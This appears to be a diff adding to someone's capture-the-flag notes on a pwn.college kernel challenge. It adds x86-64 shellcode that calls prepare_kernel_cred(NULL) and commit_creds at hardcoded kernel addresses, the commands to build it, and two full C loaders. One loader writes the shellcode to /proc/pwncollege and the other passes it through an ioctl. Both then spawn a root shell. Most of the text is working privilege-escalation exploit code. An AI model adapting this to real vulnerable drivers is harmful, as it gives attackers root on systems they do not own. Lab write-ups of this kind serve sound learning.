@@ -222,8 +222,247 @@ first call does the printk (use dmesg to see out), 2nd prep(0), 3rd jump commits
 - yea we just emulate the "win function", not that deep tbh, same as userspace, ill just give some ss and the shellcode snippet for this poc: 
 
 
-```c
+```s
+.intel_syntax noprefix
+.section .text
+.global _start
+
+_start:
+    push rbp                    /* align stack for call */
+
+    xor edi, edi
+    movabs rax, 0xffffffff81089660
+    call rax                    /* prepare_kernel_cred(NULL) */
+
+    mov rdi, rax
+    pop rbp                     /* restore original call stack */
+
+    movabs rax, 0xffffffff81089310
+    jmp rax                     /* commit_creds(cred) */
+
 
 ```
 
+- this does the priv esc part.
 
+`compilation :` 
+`gcc -c -nostdlib -fno-pie -o shellcode.o shellcode.S`
+
+`objcopy -O binary -j .text shellcode.o shellcode.bin
+`
+
+c shellcode payload prop is a pain so i ai'd a shitty script to do allat :
+
+```c
+#include <errno.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+#define DEVICE_PATH "/proc/pwncollege"
+#define SHELLCODE_PATH "./shellcode.bin"
+#define MAX_SHELLCODE_SIZE 0x1000
+
+int main(void)
+{
+    int scfd = open(SHELLCODE_PATH, O_RDONLY);
+    if (scfd < 0) {
+        perror("open shellcode.bin");
+        return 1;
+    }
+
+    struct stat st;
+    if (fstat(scfd, &st) < 0) {
+        perror("fstat");
+        close(scfd);
+        return 1;
+    }
+
+    if (st.st_size <= 0 || st.st_size > MAX_SHELLCODE_SIZE) {
+        fprintf(stderr, "invalid shellcode size: %ld\n", (long)st.st_size);
+        close(scfd);
+        return 1;
+    }
+
+    size_t sc_size = (size_t)st.st_size;
+    unsigned char *shellcode = malloc(sc_size);
+    if (!shellcode) {
+        perror("malloc");
+        close(scfd);
+        return 1;
+    }
+
+    size_t loaded = 0;
+    while (loaded < sc_size) {
+        ssize_t n = read(scfd, shellcode + loaded, sc_size - loaded);
+
+        if (n < 0) {
+            if (errno == EINTR)
+                continue;
+
+            perror("read");
+            free(shellcode);
+            close(scfd);
+            return 1;
+        }
+
+        if (n == 0) {
+            fprintf(stderr, "unexpected EOF\n");
+            free(shellcode);
+            close(scfd);
+            return 1;
+        }
+
+        loaded += (size_t)n;
+    }
+
+    close(scfd);
+
+    int fd = open(DEVICE_PATH, O_RDWR);
+    if (fd < 0) {
+        perror("open device");
+        free(shellcode);
+        return 1;
+    }
+
+    printf("writing %zu bytes to %s\n", sc_size, DEVICE_PATH);
+
+    ssize_t written = write(fd, shellcode, sc_size);
+    if (written < 0) {
+        perror("write");
+        close(fd);
+        free(shellcode);
+        return 1;
+    }
+
+    printf("module returned: %zd\n", written);
+    printf(" uid=%d euid=%d\n", getuid(), geteuid());
+
+    close(fd);
+    free(shellcode);
+
+    execl("/bin/sh", "sh", NULL);
+    perror("execl");
+    return 1;
+}
+
+```
+---
+
+### another variant of the same poc 
+
+```c
+#include <errno.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <stddef.h>
+#define DEVICE_PATH "/proc/pwncollege"
+#define SHELLCODE_PATH "./shellcode.bin"
+
+#define IOCTL_EXECUTE 1337
+#define MAX_SHELLCODE_SIZE 0x1000
+
+/* Addr ret by _vmalloc() */
+#define SHELLCODE_EXEC_ADDR 0xffffc900000b1000ULL
+
+struct ioctl_request {
+    uint64_t shellcode_length;                  /*  0x0000 */
+    unsigned char shellcode[MAX_SHELLCODE_SIZE]; /*  0x0008 */
+    uint64_t execute_address;                   /*  0x1008 */
+};
+
+
+
+static int read_shellcode(struct ioctl_request *request)
+{
+    int scfd = open(SHELLCODE_PATH, O_RDONLY);
+
+    struct stat st;
+
+    if (fstat(scfd, &st) < 0) {
+        perror("fstat");
+        close(scfd);
+        return -1;
+    }
+
+
+    request->shellcode_length = (uint64_t)st.st_size;
+
+    size_t loaded = 0;
+    size_t shellcode_size = (size_t)st.st_size;
+
+    while (loaded < shellcode_size) {
+        ssize_t n = read(
+            scfd,
+            request->shellcode + loaded,
+            shellcode_size - loaded
+        );
+
+        loaded += (size_t)n;
+    }
+
+    close(scfd);
+    return 0;
+}
+
+int main(void)
+{
+    struct ioctl_request *request = calloc(1, sizeof(*request));
+    if (!request) {
+        perror("calloc");
+        return 1;
+    }
+
+    if (read_shellcode(request) < 0) {
+        free(request);
+        return 1;
+    }
+
+    request->execute_address = SHELLCODE_EXEC_ADDR;
+
+   
+    int fd = open(DEVICE_PATH, O_RDWR);
+    if (fd < 0) {
+        perror("open device");
+        free(request);
+        return 1;
+    }
+
+    /*
+     * Kernel parses request as:
+     *
+     *   arg + 0x0000 -> shellcode length
+     *   arg + 0x0008 -> shellcode bytes
+     *   arg + 0x1008 -> execution function pointer
+     */
+    long result = ioctl(fd, IOCTL_EXECUTE, request);
+    if (result < 0) {
+        perror("ioctl");
+        close(fd);
+        free(request);
+        return 1;
+    }
+
+    printf("ioctl returned: %ld\n", result);
+    printf("uid=%d euid=%d\n", getuid(), geteuid());
+
+    close(fd);
+    free(request);
+
+    execl("/bin/sh", "sh", "-p", NULL);
+    perror("execl");
+    return 1;
+}
+```
+
+![alt text](image-7.png)
+
+- put bp at vmalloc and restart the module to see at what addr the vmalloc returns.
